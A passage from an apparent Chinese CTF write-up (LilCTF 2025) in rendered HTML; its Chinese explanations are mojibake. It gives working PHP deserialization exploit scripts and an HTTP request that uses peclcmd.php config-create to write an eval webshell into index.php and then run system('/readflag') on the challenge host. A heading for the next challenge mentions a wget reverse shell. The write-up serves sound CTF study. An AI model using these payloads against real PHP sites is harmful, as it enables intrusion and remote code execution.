</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$ser</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;user&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$ser</span><span class="p">,</span> <span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$ser</span><span class="p">,</span> <span class="s1">&#39;Access&#34;:&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span> <span class="p">(</span><span class="s2">&#34;no way!!!!&#34;</span><span class="p">);</span><span class="c1">#ï¼ˆwpè¯´åˆ©ç”¨ PHP ç±»åå¤§å°å†™ä¸æ•æ„Ÿç»•è¿‡Accessï¼Œä½†æ˜¯è¿™é‡Œæ˜¯&amp;&amp;ï¼Œæˆ‘adminç»•è¿‡äº†åé¢å°±ä¸éœ€è¦ç»•äº†ï¼‰
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$ser</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;nonono!!!&#34;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ˜¯å¼€å§‹çš„é¢˜ï¼Œç›´æ¥åˆ©ç”¨16è¿›åˆ¶ç»•è¿‡å˜é‡å+filteré“¾æ‰“å®Œäº†ï¼ˆ<strong>GCå°±å»æ‰æœ€åä¸€ä¸ª}å°±è¡Œï¼Œè¿˜æœ‰S+16è¿›åˆ¶ç»•è¿‡äº†$ser != $this-&gt;valueï¼Œå› ä¸ºååºåˆ—åŒ–åå†åºåˆ—åŒ–Så˜säº†</strong>ï¼‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="o">=</span><span class="s2">&#34;admin&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Access</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$prefix</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$suffix</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$prefix</span><span class="p">,</span><span class="nv">$suffix</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">prefix</span><span class="o">=</span><span class="nv">$prefix</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">suffix</span><span class="o">=</span><span class="nv">$suffix</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">value</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Access</span><span class="p">(</span><span class="s2">&#34;php://filter/&#34;</span><span class="p">,</span><span class="s2">&#34;/resource=/flag&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;s:5:</span><span class="se">\&#34;</span><span class="s2">admin</span><span class="se">\&#34;</span><span class="s2">;&#34;</span><span class="p">,</span><span class="s2">&#34;S:5:</span><span class="se">\&#34;\\</span><span class="s2">61dmin</span><span class="se">\&#34;</span><span class="s2">;&#34;</span><span class="p">,</span><span class="nv">$b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¥çœ‹çœ‹é¢˜ç›®æ”¹åçš„æ ·å­</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">exec</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">value</span><span class="p">,</span> <span class="s1">&#39;S:&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$ser</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">value</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$instance</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$ser</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$ser</span> <span class="o">!=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">value</span> <span class="o">&amp;&amp;</span> <span class="nv">$instance</span> <span class="nx">instanceof</span> <span class="nx">Access</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">include</span><span class="p">(</span><span class="nv">$instance</span><span class="o">-&gt;</span><span class="na">getToken</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;wanna ?&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Access</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$prefix</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$suffix</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getToken</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">prefix</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">suffix</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;Go to HELL!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">prefix</span> <span class="o">.</span> <span class="s1">&#39;lilctf&#39;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">suffix</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="s1">&#39;pearcmd&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;Can I have peachcmd?&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$ser</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;user&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$ser</span><span class="p">,</span> <span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="o">||</span> <span class="nx">stripos</span><span class="p">(</span><span class="nv">$ser</span><span class="p">,</span> <span class="s1">&#39;Access&#34;:&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span> <span class="p">(</span><span class="s2">&#34;no way!!!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$ser</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;nonono!!!&#34;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="err">é¢˜ç›®ä½œè€…æ”¹å</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">usernameå¼º</span><span class="o">==</span><span class="n">admin</span><span class="p">,</span><span class="err">æ— ä¼¤å¤§é›…ï¼Œä¸€æ ·ç›´æ¥ç»•ï¼Œè¿˜åŠ äº†ä¸€ä¸ª</span><span class="n">ifæ£€æµ‹S</span><span class="p">:,</span><span class="err">æ²¡ä»€ä¹ˆç”¨ï¼Œå› ä¸º$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">valueæ˜¯åºåˆ—åŒ–çš„Access</span><span class="err">ï¼Œè€Œå…¶ä¸­å¹¶æ²¡æœ‰</span><span class="n">S</span><span class="p">:</span><span class="err">ã€‚</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">ä½œè€…åé¢è¿˜æ”¹äº†ä¸€ä¸‹å˜ä¸º$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">prefix</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="s1">&#39;lilctf&#39;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">suffix</span><span class="p">.</span><span class="err">â€˜</span><span class="n">php</span><span class="err">â€™ï¼Œè¿™å°±æœ‰ç‚¹éº»çƒ¦äº†ï¼Œè¿™å°±å¿…é¡»æŒ‰ç…§ä½œè€…çš„æƒ³æ³•æ‰“</span><span class="n">pearcmdæ–‡ä»¶åŒ…å«</span><span class="err">ï¼Œä½†æ˜¯å¤ç°ç¯å¢ƒæ²¡åŠ </span><span class="n">php</span><span class="err">ï¼Œä½†æ˜¯æ¥ä¸‹æ¥æˆ‘ä»¬è¿˜æ˜¯ç”¨</span><span class="n">pearcmdæ‰“æ‰“</span><span class="err">ï¼ˆå› ä¸ºå¤ç°ç¯å¢ƒ</span><span class="n">flagåœ¨</span><span class="o">/</span><span class="n">readflag</span><span class="err">ï¼Œå‰é¢çš„æ‰“æ³•æ‹¿ä¸åˆ°</span><span class="n">flag</span><span class="err">ï¼‰ï¼Œç”±äº</span><span class="n">pearcmdè¿‡æ»¤äº†å°±ç”¨peclcmdä»£æ›¿</span><span class="err">ã€‚</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">æœ€åå°±æ˜¯</span><span class="n">strposæ”¹æˆstriposè€Œä¸”</span><span class="o">&amp;&amp;</span><span class="err">å˜ä¸ºäº†</span><span class="o">||</span><span class="err">ï¼Œå¤§å°å†™ç»•ä¸è¿‡ï¼Œé‚£å°±ç”¨åˆ©ç”¨ä¸å®Œæ•´ç±»æ¥è®©</span><span class="o">`</span><span class="n">__PHP_Incomplete_Class_Name</span><span class="o">`</span><span class="w"> </span><span class="err">çš„æˆå‘˜å˜ä¸ºç±»å</span><span class="p">,</span><span class="w"> </span><span class="err">è¿™æ ·ä¹Ÿä¼šè®©ä¸¤æ¬¡ååºåˆ—åŒ–ç»“æœä¸ä¸€è‡´</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><img src="image-20250906171043037.png" alt="image-20250906171043037" style="zoom:50%;" />
<p>æ‰€ä»¥expæ˜¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="o">=</span><span class="s2">&#34;admin&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Access</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$prefix</span><span class="o">=</span><span class="s2">&#34;/usr/local/lib/&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$suffix</span><span class="o">=</span><span class="s2">&#34;/../php/peclcmd.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="k">new</span> <span class="nx">Access</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;Access&#34;:2&#39;</span><span class="p">,</span><span class="s1">&#39;Helllo&#34;:3&#39;</span><span class="p">,</span><span class="nv">$b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$b</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">.=</span><span class="s1">&#39;s:27:&#34;__PHP_Incomplete_Class_Name&#34;;s:6:&#34;Access&#34;;}&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">value</span><span class="o">=</span><span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;s:5:</span><span class="se">\&#34;</span><span class="s2">admin</span><span class="se">\&#34;</span><span class="s2">;&#34;</span><span class="p">,</span><span class="s2">&#34;S:5:</span><span class="se">\&#34;\\</span><span class="s2">61dmin</span><span class="se">\&#34;</span><span class="s2">;&#34;</span><span class="p">,</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">POST</span> <span class="o">/?+</span><span class="nx">config</span><span class="o">-</span><span class="nx">create</span><span class="o">+/&lt;?=</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="cp">?&gt;</span><span class="err">+/var/www/html/index.php HTTP/1.1
</span></span></span><span class="line"><span class="cl"><span class="err">Host: gz.imxbt.cn:20379
</span></span></span><span class="line"><span class="cl"><span class="err">Content-Type: application/x-www-form-urlencoded
</span></span></span><span class="line"><span class="cl"><span class="err">Connection: close
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">user=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3BS%3A5%3A%22%5C61dmin%22%3Bs%3A5%3A%22value%22%3Bs%3A147%3A%22O%3A6%3A%22Helllo%22%3A3%3A%7Bs%3A9%3A%22%00*%00prefix%22%3Bs%3A15%3A%22%2Fusr%2Flocal%2Flib%2F%22%3Bs%3A9%3A%22%00*%00suffix%22%3Bs%3A19%3A%22%2F..%2Fphp%2Fpeclcmd.php%22%3Bs%3A27%3A%22__PHP_Incomplete_Class_Name%22%3Bs%3A6%3A%22Access%22%3B%7D%22%3B&amp;0=system(&#39;/readflag&#39;);
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å‘åŒ…2æ¬¡å°±è¡Œï¼ˆç¬¬ä¸€æ¬¡å°†é©¬å†™å…¥index.phpï¼Œä¹Ÿå°±æ˜¯å½“å‰ç›®å½•,ç„¶åå½“å‰é¡µé¢æœ‰é©¬å°±å‘½ä»¤æ‰§è¡Œå‘—ï¼‰</p>
<p><img src="/p/2025-lilctf/image-20250906173946768.png"
	width="1917"
	height="300"
	srcset="/p/2025-lilctf/image-20250906173946768_hu_478cffeed26ecfcc.png 480w, /p/2025-lilctf/image-20250906173946768_hu_9c6876bcc9051380.png 1024w"
	loading="lazy"
	
		alt="image-20250906173946768"
	
	
		class="gallery-image" 
		data-flex-grow="639"
		data-flex-basis="1533px"
	
></p>
<h2 id="ekko_note">Ekko_note
</h2><h3 id="è€ƒç‚¹åˆ©ç”¨uuid8ä¼ªé€ tokenpythonèµ·æœåŠ¡å™¨ä¼ªé€ apiwgetåå¼¹shell">è€ƒç‚¹ï¼šåˆ©ç”¨uuid8ä¼ªé€ token+pythonèµ·æœåŠ¡å™¨ä¼ªé€ api+wgetåå¼¹shell
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
